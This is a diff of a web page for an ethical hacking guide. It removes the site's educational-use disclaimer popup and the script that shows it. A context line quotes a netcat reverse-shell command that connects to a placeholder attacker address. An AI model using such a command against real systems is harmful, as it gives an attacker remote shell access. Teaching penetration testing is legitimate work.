@@ -27,14 +27,7 @@
         <img src="Ethical_Hacking_Guide.jpg" alt="Ethical Hacking Guide Logo" class="logo">
     </div>
 
-    <!--Disclaimer-->
- <div id="disclaimerPopup" class="popup">
-        <div class="popup-content">
-            <h2>NOTICE</h2>
-            <p>The information provided on this site is intended for educational purposes only. Any use of this information for unethical purposes is a violation of Terms of Use.</p>
-            <button id="acceptButton">I Will Not Hack Without Consent</button>
-        </div>
-    </div>
+  
 
     
     <!-- Penetration Testing Framework Section -->
@@ -289,24 +282,7 @@ nc -e /bin/bash attacker_ip 4444</code></pre>
     <footer>
         <p>&copy; 2024 The Cyber Index. All rights reserved.</p>
     </footer>
-         <!-- Popup Notice JavaScript -->
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            var popup = document.getElementById("disclaimerPopup");
-            var acceptButton = document.getElementById("acceptButton");
-
-            // Check if the user has already accepted the disclaimer
-            if (!localStorage.getItem("disclaimerAccepted")) {
-                popup.style.display = "flex"; // Show the popup
-            }
-
-            acceptButton.addEventListener("click", function () {
-                localStorage.setItem("disclaimerAccepted", "true");
-                popup.style.display = "none"; // Hide the popup
-                document.body.style.overflow = "auto"; // Enable scrolling
-            });
-        });
-    </script>
+     
     
 <!-- JavaScript to hide navbar on scroll down and show on scroll up -->
 <script>
